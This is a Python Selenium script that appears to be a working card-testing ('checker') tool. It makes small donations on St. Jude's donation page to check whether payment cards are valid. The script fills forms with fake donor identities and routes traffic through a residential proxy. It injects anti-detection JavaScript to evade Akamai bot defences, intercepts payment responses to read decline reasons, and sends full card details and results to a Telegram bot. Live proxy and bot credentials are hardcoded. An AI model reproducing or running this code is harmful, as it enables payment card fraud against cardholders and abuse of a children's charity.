#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
St. Jude Donation Checker — v13 (Railway Edition)
"""

import re
import os
import time
import json
import random
import threading
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

TEST_CARD = "5104040287872188|12|2027|951"

BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = "6843321125"

BD_HOST = "brd.superproxy.io"
BD_PORT = "9515"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

DONATE_URL = "https://www.stjude.org/donate/donate-to-st-jude.html"

COUNTRIES = ["us", "us", "us"]

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]

ADDRESSES = [
    {"a1": "1600 Amphitheatre Pkwy", "a2": "", "c": "Mountain View", "s": "CA", "z": "94043"},
    {"a1": "350 Fifth Avenue", "a2": "Floor 21", "c": "New York", "s": "NY", "z": "10118"},
    {"a1": "233 S Wacker Dr", "a2": "Suite 4400", "c": "Chicago", "s": "IL", "z": "60606"},
    {"a1": "1 Microsoft Way", "a2": "", "c": "Redmond", "s": "WA", "z": "98052"},
    {"a1": "4 Yawkey Way", "a2": "Apt 3B", "c": "Boston", "s": "MA", "z": "02215"},
]


# ═══════════════════════════════════════════════════════════
# TELEGRAM
# ═══════════════════════════════════════════════════════════

def send_telegram_photo(photo_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': CHAT_ID, 'caption': caption[:1024]}
            r = requests.post(url, files=files, data=data, timeout=30)
            return r.status_code == 200
    except:
        return False


def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': text[:4000], 'parse_mode': 'HTML'}
        r = requests.post(url, data=data, timeout=30)
        return r.status_code == 200
    except:
        return False


def screenshot_and_send(driver, name):
    try:
        save_dir = "/app/screenshots"
        os.makedirs(save_dir, exist_ok=True)
        path = os.path.join(save_dir, f"{int(time.time())}_{name}.png")
        try:
            driver.execute_script("window.scrollTo(0, 0);")
            time.sleep(0.1)
            driver.save_screenshot(path)
        except:
            driver.save_screenshot(path)
        print(f"📸 {name}", flush=True)
        important = ["05_form_filled", "06_donate_clicked", "07_response"]
        if any(k in name for k in important):
            send_telegram_photo(path, caption=f"📸 {name}")
        return path
    except Exception as e:
        print(f"Screenshot err: {str(e)[:80]}", flush=True)
        return None


# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════

def make_email(first, last):
    f = first.lower().replace(" ", "")
    l = last.lower().replace(" ", "")
    n = random.randint(100, 999)
    return f"{f}{l}{n}@gmail.com"


# ═══════════════════════════════════════════════════════════
# JS INJECTION
# ═══════════════════════════════════════════════════════════

JS_INJECT = """
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
window.chrome = {runtime: {}, loadTimes: function() {}, csi: function() {}, app: {isInstalled: false}};
Object.defineProperty(navigator, 'plugins', {
    get: () => {
        const plugins = [
            {name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
            {name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: ""},
            {name: "Native Client", filename: "internal-nacl-plugin", description: ""}
        ];
        plugins.length = 3;
        return plugins;
    }
});
Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
Object.defineProperty(navigator, 'platform', {get: () => 'Win32'});
Object.defineProperty(navigator, 'vendor', {get: () => 'Google Inc.'});
Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 0});
const originalQuery = window.navigator.permissions.query;
window.navigator.permissions.query = (parameters) => (
    parameters.name === 'notifications' ?
        Promise.resolve({state: Notification.permission}) :
        originalQuery(parameters)
);
const getParameter = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function(parameter) {
    if (parameter === 37445) return 'Intel Inc.';
    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
    return getParameter(parameter);
};
"""


# ═══════════════════════════════════════════════════════════
# WORKER CLASS
# ═══════════════════════════════════════════════════════════

class StJudeWorker:
    def __init__(self):
        self.driver = None

    def log(self, msg):
        print(msg, flush=True)

    def start(self):
        for attempt in range(1, 6):
            try:
                options = Options()
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-gpu")
                options.add_argument("--window-size=1366,900")
                options.add_argument("--lang=en-US")
                options.add_argument("--disable-blink-features=AutomationControlled")
                options.add_argument("--no-first-run")
                options.add_argument("--no-default-browser-check")
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)

                # ═══ Chrome binary ═══
                chrome_paths = [
                    '/usr/bin/chromium',
                    '/usr/bin/chromium-browser',
                    '/usr/bin/google-chrome',
                ]
                for p in chrome_paths:
                    if os.path.exists(p):
                        options.binary_location = p
                        self.log(f"✅ Chrome: {p}")
                        break

                # ═══ BrightData Proxy ═══
                sid = str(random.randint(1000000, 9999999))
                country = random.choice(COUNTRIES)
                proxy_user = f"{BD_USER}-country-{country}-session-{sid}"

                proxy_auth_plugin = f"""
                var config = {{
                    mode: "fixed_servers",
                    rules: {{
                        singleProxy: {{
                            scheme: "http",
                            host: "{BD_HOST}",
                            port: parseInt({BD_PORT})
                        }},
                        bypassList: ["localhost"]
                    }}
                }};
                chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
                chrome.webRequest.onAuthRequired.addListener(
                    function(details) {{
                        return {{
                            authCredentials: {{
                                username: "{proxy_user}",
                                password: "{BD_PASS}"
                            }}
                        }};
                    }},
                    {{urls: ["<all_urls>"]}},
                    ["blocking"]
                );
                """

                plugin_path = "/tmp/proxy_auth_plugin"
                os.makedirs(plugin_path, exist_ok=True)

                with open(f"{plugin_path}/manifest.json", "w") as f:
                    f.write('{"version":"1.0.0","manifest_version":2,"name":"Proxy Auth","permissions":["proxy","tabs","unlimitedStorage","storage","<all_urls>","webRequest","webRequestBlocking"],"background":{"scripts":["background.js"]},"minimum_chrome_version":"22.0.0"}')

                with open(f"{plugin_path}/background.js", "w") as f:
                    f.write(proxy_auth_plugin)

                options.add_argument(f'--load-extension={plugin_path}')

                self.log(f"🌐 Connect BD [{country.upper()}] session={sid}...")

                # ═══ Driver ═══
                driver_path = None
                driver_paths = ['/usr/bin/chromedriver', '/usr/local/bin/chromedriver']
                for p in driver_paths:
                    if os.path.exists(p):
                        driver_path = p
                        self.log(f"✅ Driver: {p}")
                        break

                if not driver_path:
                    try:
                        from webdriver_manager.chrome import ChromeDriverManager
                        driver_path = ChromeDriverManager().install()
                        self.log("✅ Downloaded Driver")
                    except Exception as e:
                        self.log(f"⚠️ webdriver-manager failed: {str(e)[:80]}")

                if driver_path and isinstance(driver_path, str):
                    service = Service(driver_path)
                    self.driver = webdriver.Chrome(service=service, options=options)
                else:
                    self.driver = webdriver.Chrome(options=options)

                try:
                    self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                        "source": JS_INJECT
                    })
                except:
                    pass

                self.driver.set_page_load_timeout(90)
                self.driver.set_script_timeout(30)
                self.driver.implicitly_wait(2)

                self.log("✅ Browser ready")
                return True

            except Exception as e:
                self.log(f"❌ Connect {attempt}/5: {str(e)[:120]}")
                if self.driver:
                    try:
                        self.driver.quit()
                    except:
                        pass
                    self.driver = None
                time.sleep(3)

        return False

    def wait_akamai(self, max_wait=15):
        self.log("⏳ Waiting for Akamai...")
        for i in range(max_wait):
            try:
                cookies = {c["name"]: c["value"] for c in self.driver.get_cookies()}
                abck = cookies.get("_abck", "")
                if abck and ("~0~0~" in abck or "~-1~-1~" in abck):
                    self.log(f"✅ Akamai passed ({i}s)")
                    return True
            except:
                pass
            time.sleep(1)
        return False

    def has_captcha(self):
        try:
            return self.driver.execute_script("""
                if (document.querySelector('iframe[src*="recaptcha"]') ||
                    document.querySelector('.g-recaptcha')) return 'recaptcha';
                if (document.querySelector('iframe[src*="hcaptcha"]') ||
                    document.querySelector('.h-captcha')) return 'hcaptcha';
                if (document.querySelector('iframe[src*="challenges.cloudflare.com"]') ||
                    document.querySelector('.cf-turnstile')) return 'turnstile';
                return null;
            """)
        except:
            return None

    def wait_for_captcha(self, max_wait=60):
        captcha = self.has_captcha()
        if not captcha:
            return True
        self.log(f"🔒 {captcha} — waiting...")
        t0 = time.time()
        while time.time() - t0 < max_wait:
            time.sleep(2)
            if not self.has_captcha():
                self.log(f"✅ {captcha} solved ({int(time.time() - t0)}s)")
                time.sleep(0.5)
                return True
        return False

    def open_page(self):
        try:
            self.log("📄 Loading page...")
            t0 = time.time()

            self.driver.get(DONATE_URL)
            self.log(f"✅ Nav done ({round(time.time() - t0, 1)}s)")

            for i in range(30):
                try:
                    ready = self.driver.execute_script("return document.readyState")
                    if ready in ["interactive", "complete"]:
                        break
                except:
                    pass
                time.sleep(1)

            self.log(f"✅ Body ready ({round(time.time() - t0, 1)}s)")
            time.sleep(2)

            self.wait_for_captcha(30)
            self.wait_akamai(15)
            time.sleep(1)

            found = False
            for i in range(60):
                try:
                    ok = self.driver.execute_script(
                        "var e=document.getElementById('continue-to-other-payment');"
                        "return e && e.offsetParent!==null && e.offsetWidth>50;"
                    )
                    if ok:
                        found = True
                        break
                except:
                    pass
                time.sleep(0.5)

            if not found:
                self.log("❌ Payment button not found")
                return False

            self.driver.execute_script(
                "var e=document.getElementById('continue-to-other-payment');"
                "if(e){e.scrollIntoView({block:'center'}); e.click();}"
            )
            self.log("👆 Other Payment Options")
            time.sleep(1.5)

            cc_found = False
            for i in range(40):
                try:
                    ok = self.driver.execute_script(
                        "var e=document.getElementById('cc-link');"
                        "return e && e.offsetParent!==null && e.offsetWidth>10;"
                    )
                    if ok:
                        cc_found = True
                        break
                except:
                    pass
                time.sleep(0.5)

            if not cc_found:
                self.log("❌ Credit Card button not found")
                return False

            self.driver.execute_script(
                "var e=document.getElementById('cc-link');"
                "if(e){e.scrollIntoView({block:'center'}); e.click();}"
            )
            self.log("👆 Credit Card")
            time.sleep(1)

            for i in range(40):
                try:
                    ok = self.driver.execute_script(
                        "var e=document.getElementById('cardNumber');"
                        "return e && e.offsetParent!==null && e.offsetWidth>10;"
                    )
                    if ok:
                        self.log(f"✅ Form ready ({round(time.time() - t0, 1)}s)")
                        self.wait_for_captcha(15)
                        time.sleep(0.5)
                        return True
                except:
                    pass
                time.sleep(0.5)

            self.log("❌ Form not found")
            return False

        except Exception as e:
            self.log(f"❌ Open error: {str(e)[:80]}")
            return False

    def set_value(self, eid, val):
        try:
            return self.driver.execute_script(
                """
                var e=document.getElementById(arguments[0]);
                if(!e)return false;
                e.scrollIntoView({block:'center'});
                e.focus();
                e.value=arguments[1];
                e.dispatchEvent(new Event('input',{bubbles:true}));
                e.dispatchEvent(new Event('change',{bubbles:true}));
                e.dispatchEvent(new Event('keyup',{bubbles:true}));
                e.dispatchEvent(new Event('blur',{bubbles:true}));
                return true;
                """,
                eid, str(val)
            )
        except:
            return False

    def type_send_keys(self, eid, val):
        try:
            el = self.driver.find_element(By.ID, eid)
            if not el.is_displayed():
                return self.set_value(eid, val)
            self.driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
            el.click()
            time.sleep(0.05)
            try:
                existing = el.get_attribute("value") or ""
                if existing:
                    el.send_keys("\u0001")
                    time.sleep(0.02)
                    el.send_keys("\u0008")
                    time.sleep(0.03)
            except:
                pass
            el.send_keys(str(val))
            time.sleep(0.05)
            try:
                el.send_keys(Keys.ESCAPE)
                time.sleep(0.03)
            except:
                pass
            return True
        except:
            return self.set_value(eid, val)

    def fill_form(self, num, mm, yy, cvv):
        try:
            if not self.driver.execute_script(
                "var e=document.getElementById('cardNumber'); return !!e && e.offsetParent!==null;"
            ):
                self.log("❌ Form not visible")
                return False

            self.log("📝 Filling form...")
            t0 = time.time()

            f = random.choice(FIRST_NAMES)
            l = random.choice(LAST_NAMES)
            em = make_email(f, l)
            ad = random.choice(ADDRESSES)
            ph = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"

            self.set_value("cardNumber", num)
            time.sleep(0.1)
            self.log("  💳 Card")

            self.set_value("expMonth", mm.zfill(2))
            time.sleep(0.05)

            self.set_value("expYear", yy[2:] if len(yy) == 4 else yy)
            time.sleep(0.05)

            self.set_value("cardCvv2", cvv)
            time.sleep(0.1)
            self.log("  💳 CVV")

            try:
                amt = self.driver.find_element(By.ID, "donationAmountOther")
                if amt.is_displayed():
                    self.set_value("donationAmountOther", "5")
                    time.sleep(0.05)
                    self.log("  💰 Amount: $5")
            except:
                pass

            self.type_send_keys("firstName", f)
            self.log(f"  ✅ First: {f}")
            time.sleep(0.05)

            self.type_send_keys("lastName", l)
            self.log(f"  ✅ Last: {l}")
            time.sleep(0.05)

            self.type_send_keys("email", em)
            self.log(f"  ✅ Email: {em}")
            time.sleep(0.1)

            self.type_send_keys("address1", ad["a1"])
            self.log("  ✅ Address")
            time.sleep(0.15)

            if ad["a2"]:
                try:
                    self.type_send_keys("address2", ad["a2"])
                    time.sleep(0.05)
                except:
                    pass

            self.type_send_keys("city", ad["c"])
            self.log(f"  ✅ City: {ad['c']}")
            time.sleep(0.15)

            try:
                state_el = self.driver.find_element(By.ID, "stateProvince")
                if state_el.is_displayed():
                    self.driver.execute_script("arguments[0].scrollIntoView({block:'center'});", state_el)
                    time.sleep(0.05)
                    Select(state_el).select_by_value(ad["s"])
                    self.log(f"  ✅ State: {ad['s']}")
                    time.sleep(0.05)
            except:
                pass

            self.type_send_keys("zipPostalCode", ad["z"])
            self.log(f"  ✅ ZIP: {ad['z']}")
            time.sleep(0.15)

            try:
                phone_el = self.driver.find_element(By.ID, "phoneNumber")
                if phone_el.is_displayed():
                    self.type_send_keys("phoneNumber", ph)
                    self.log("  ✅ Phone")
                    time.sleep(0.05)
            except:
                pass

            try:
                body = self.driver.find_element(By.TAG_NAME, "body")
                body.send_keys(Keys.ESCAPE)
                time.sleep(0.1)
            except:
                pass

            elapsed = round(time.time() - t0, 2)
            self.log(f"✅ Form filled in {elapsed}s")
            self.log(f"👤 {f} {l} | {ad['c']}, {ad['s']}")

            time.sleep(0.3)
            return True

        except Exception as e:
            self.log(f"❌ Fill error: {str(e)[:80]}")
            return False

    def inject_fetch_interceptor(self):
        try:
            self.driver.execute_script("""
                window.__stjude_responses = [];
                if (!window.__stjude_hooked) {
                    window.__stjude_hooked = true;
                    var origFetch = window.fetch;
                    window.fetch = function() {
                        var url = arguments[0];
                        var urlStr = typeof url === 'string' ? url : (url && url.url) || '';
                        return origFetch.apply(this, arguments).then(function(response) {
                            var clone = response.clone();
                            clone.text().then(function(body) {
                                window.__stjude_responses.push({
                                    url: urlStr, body: body, status: response.status,
                                    time: Date.now()
                                });
                            }).catch(function(){});
                            return response;
                        });
                    };
                    var origOpen = XMLHttpRequest.prototype.open;
                    var origSend = XMLHttpRequest.prototype.send;
                    XMLHttpRequest.prototype.open = function(m, u) {
                        this.__url = u;
                        return origOpen.apply(this, arguments);
                    };
                    XMLHttpRequest.prototype.send = function() {
                        var self = this;
                        this.addEventListener('load', function() {
                            window.__stjude_responses.push({
                                url: self.__url || '', body: self.responseText || '',
                                status: self.status, time: Date.now()
                            });
                        });
                        return origSend.apply(this, arguments);
                    };
                }
            """)
            self.log("✅ Fetch interceptor")
            return True
        except Exception as e:
            self.log(f"❌ Inject err: {str(e)[:80]}")
            return False

    def read_real_response(self):
        try:
            responses = self.driver.execute_script("return window.__stjude_responses || [];")
            if responses:
                for resp in reversed(responses):
                    body = resp.get('body', '')
                    if not body:
                        continue
                    body_lower = body.lower()
                    important = ['insufficient', 'declined', 'expired', 'invalid',
                                 'do not honor', 'fraud', 'restricted', 'thank you']
                    if any(kw in body_lower for kw in important):
                        try:
                            data = json.loads(body)
                            if isinstance(data, dict):
                                for key in ['reason', 'description', 'message', 'error']:
                                    if data.get(key):
                                        return str(data[key])
                        except:
                            pass
                        clean = re.sub(r'\s+', ' ', body).strip()
                        return clean[:300]
        except:
            pass

        try:
            page_text = self.driver.execute_script(
                "return document.body ? document.body.innerText : ''"
            ) or ""
            if page_text:
                clean = re.sub(r'\s+', ' ', page_text)
                required = ["we need your email", "is required", "please enter",
                           "please provide", "please select", "please fill"]
                patterns = [
                    r"there are insufficient funds[^.]*\.",
                    r"insufficient funds[^.]*\.",
                    r"security code is invalid[^.]*\.",
                    r"card number is invalid[^.]*\.",
                    r"card has expired[^.]*\.",
                    r"your card was declined[^.]*\.",
                    r"card was declined[^.]*\.",
                    r"do not honor[^.]*\.",
                    r"suspected fraud[^.]*\.",
                    r"restricted card[^.]*\.",
                    r"not authorized[^.]*\.",
                    r"invalid card[^.]*\.",
                    r"expired card[^.]*\.",
                    r"transaction was declined[^.]*\.",
                    r"payment was declined[^.]*\.",
                    r"thank you for your donation[^.]*\.",
                    r"your donation was successful[^.]*\.",
                    r"we are sorry[^.]*\.",
                    r"unable to process[^.]*\.",
                ]
                for pat in patterns:
                    m = re.search(pat, clean, re.IGNORECASE)
                    if m:
                        msg = m.group(0).strip()
                        if any(rk in msg.lower() for rk in required):
                            continue
                        self.log(f"📢 {msg}")
                        return msg
        except:
            pass

        return None

    def click_donate(self):
        self.log("👆 Clicking Donate...")
        try:
            ok = self.driver.execute_script(
                "var e=document.getElementById('donateButton');"
                "if(e){e.scrollIntoView({block:'center'}); e.click(); return true;}"
                "return false;"
            )
            if not ok:
                btn = self.driver.find_element(By.ID, "donateButton")
                self.driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
                time.sleep(0.2)
                btn.click()
            self.log("✅ Donate clicked")
            return True
        except Exception as e:
            self.log(f"❌ Donate err: {str(e)[:80]}")
            return False

    def check_card(self, card):
        try:
            t0 = time.time()

            if self.driver is None:
                if not self.start():
                    return ("BD_FAILED", 0)
                if not self.open_page():
                    return ("PAGE_FAILED", 0)

            parts = card.strip().split("|")
            if len(parts) < 4:
                return ("INVALID_FORMAT", 0)

            num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
            if len(yy) == 2:
                yy = "20" + yy

            send_telegram_message(
                f"🔍 <b>فحص البطاقة</b>\n"
                f"💳 <code>{num[:6]}****{num[-4:]}</code>"
            )

            if not self.fill_form(num, mm, yy, cvv):
                return ("FILL_FAILED", round(time.time() - t0, 1))

            time.sleep(0.3)
            screenshot_and_send(self.driver, "05_form_filled")

            self.inject_fetch_interceptor()

            if not self.click_donate():
                return ("DONATE_FAILED", round(time.time() - t0, 1))

            self.log("⏳ Waiting for response...")
            response = None
            max_wait = 30
            start_wait = time.time()

            while time.time() - start_wait < max_wait:
                resp = self.read_real_response()
                if resp:
                    response = resp
                    break
                time.sleep(1)

            if response:
                screenshot_and_send(self.driver, "07_response")
                return (response[:300], round(time.time() - t0, 1))

            screenshot_and_send(self.driver, "07_no_response")
            return ("NO_RESPONSE", round(time.time() - t0, 1))

        except Exception as e:
            return (f"ERR: {str(e)[:80]}", 0)

    def close(self):
        try:
            if self.driver:
                self.driver.quit()
                self.driver = None
        except:
            pass


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    print("=" * 60, flush=True)
    print("  St. Jude Checker — v13 (Railway)", flush=True)
    print("=" * 60, flush=True)
    print(f"💳 Card: {TEST_CARD}", flush=True)
    print("=" * 60, flush=True)

    send_telegram_message(
        f"🚀 <b>بدأ الفحص</b>\n💳 <code>{TEST_CARD}</code>"
    )

    t = StJudeWorker()
    res, el = t.check_card(TEST_CARD)
    t.close()

    print("\n" + "=" * 60, flush=True)
    print(f"💳 {TEST_CARD}", flush=True)
    print(f"📝 {res}", flush=True)
    print(f"⏱️ {el}s", flush=True)
    print("=" * 60, flush=True)

    send_telegram_message(
        f"📊 <b>النتيجة النهائية</b>\n"
        f"💳 <code>{TEST_CARD}</code>\n"
        f"📝 <code>{res}</code>\n"
        f"⏱️ {el}s"
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 توقف", flush=True)
    except Exception as e:
        print(f"\n❌ خطأ عام: {str(e)[:200]}", flush=True)
        send_telegram_message(f"❌ <b>خطأ عام:</b>\n<code>{str(e)[:300]}</code>")
